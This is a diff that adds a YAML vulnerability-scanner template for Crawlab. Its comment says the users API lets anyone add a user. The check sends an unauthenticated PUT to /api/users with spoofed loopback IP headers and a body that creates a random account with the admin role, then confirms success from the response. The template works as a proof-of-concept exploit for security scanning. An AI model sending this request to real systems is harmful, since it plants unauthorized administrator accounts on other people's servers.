@@ -1,0 +1,24 @@
+name: Crawlab-users-Addbyanyuser
+set:
+    r1: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: PUT
+      path: /api/users
+      headers:
+        Accept: application/json, text/plain, */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
+        x-forwarded-for: 127.0.0.1
+        x-originating-ip: 127.0.0.1
+        x-remote-ip: 127.0.0.1
+        x-remote-addr: 127.0.0.1
+      body: |
+        {"username":"{{r1}}","password":"{{r1}}","role":"admin","email":"{{r1}}@qq.com"}
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+expression: r0()
+detail:
+  links:
+    - Crawlab users 的 api 存在任意用户添加
